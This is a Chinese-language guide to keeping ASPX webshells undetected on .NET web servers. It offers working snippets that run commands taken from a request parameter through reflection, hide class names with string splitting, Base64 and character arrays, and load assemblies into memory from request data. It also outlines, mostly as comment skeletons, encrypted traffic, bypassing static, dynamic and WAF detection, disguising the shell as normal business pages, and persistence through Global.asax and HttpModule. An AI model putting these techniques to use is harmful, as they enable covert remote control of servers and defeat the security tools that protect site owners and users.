# ASPX Webshell 免杀

ASPX Webshell的免杀技术，针对.NET Web应用。

## 危险类和方法

### 需要避免或混淆
- Process.Start()
- ProcessStartInfo
- System.Diagnostics.Process
- System.CodeDom.Compiler
- System.Reflection.Assembly

## 替代方案

### 反射调用
```aspx
<%@ Page Language="C#" %>
<%
// 使用反射避免直接调用
Type processType = Type.GetType("System.Diagnostics.Process");
MethodInfo startMethod = processType.GetMethod("Start", new Type[] { typeof(string) });
object process = startMethod.Invoke(null, new object[] { Request["cmd"] });
%>
```

### 动态编译
```aspx
<%
// 使用CSharpCodeProvider动态编译
// 运行时生成代码
// 避免静态特征
%>
```

### PowerShell调用
```aspx
<%
// 调用PowerShell
// 使用EncodedCommand
// 绕过检测
%>
```

## 混淆技术

### 字符串拆分
```aspx
<%
string className = "Sys" + "tem.Dia" + "gnostics.Pro" + "cess";
Type t = Type.GetType(className);
%>
```

### Base64编码
```aspx
<%
string encoded = "U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3M=";
string className = Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
%>
```

### 字符数组
```aspx
<%
char[] chars = {'P','r','o','c','e','s','s'};
string className = "System.Diagnostics." + new string(chars);
%>
```

## 内存执行

### Assembly.Load
```aspx
<%
// 从内存加载程序集
byte[] assemblyBytes = Convert.FromBase64String(Request["asm"]);
Assembly assembly = Assembly.Load(assemblyBytes);
%>
```

### Reflection.Emit
```aspx
<%
// 动态生成IL代码
// 运行时编译
// 无文件落地
%>
```

## 流量加密

### AES加密
```aspx
<%
// 请求参数AES加密
// 响应内容AES加密
// 密钥协商
%>
```

### RSA加密
```aspx
<%
// 非对称加密
// 密钥交换
// 安全通信
%>
```

## 检测绕过

### 静态检测
```aspx
<%
// 避免关键字
// 使用反射
// 代码混淆
%>
```

### 动态检测
```aspx
<%
// 延迟执行
// 条件触发
// 环境检测
%>
```

### WAF绕过
```aspx
<%
// ViewState利用
// 参数编码
// 请求方法变换
%>
```

## 业务伪装

### 配置管理
```aspx
<%
// 伪装成配置管理页面
// 提供正常功能
// 隐藏恶意代码
%>
```

### 文件上传
```aspx
<%
// 伪装成文件上传功能
// 正常业务混合
// 降低怀疑
%>
```

## 持久化

### Global.asax
```aspx
// 在Application_Start中注册
// 应用启动时加载
// 持久化访问
```

### HttpModule
```aspx
// 注册自定义HttpModule
// 拦截所有请求
// 隐蔽性强
```

## 生成策略

根据目标环境选择：
- 低防护：基础反射调用
- 中防护：动态编译 + 加密
- 高防护：内存执行 + 流量加密

---

ASPX Webshell免杀需要深入理解.NET反射机制和ASP.NET的工作原理。
